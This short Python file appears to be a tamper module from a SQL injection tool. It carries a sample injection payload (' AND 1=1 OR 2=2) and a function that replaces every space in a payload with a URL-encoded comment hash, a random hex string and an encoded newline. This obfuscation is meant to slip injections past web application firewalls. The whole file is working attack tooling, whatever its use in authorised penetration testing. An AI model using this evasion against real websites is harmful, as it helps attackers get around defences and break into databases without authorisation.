import uuid

__example_payload__ = "' AND 1=1 OR 2=2"
__type__ = "changing the payload spaces to obfuscated hashes with a newline"


def tamper(payload, **kwargs):
    modifier = f"%%23{uuid.uuid4().hex[1:5]}%%0A"
    return "".join(modifier if char == " " else char for char in payload)
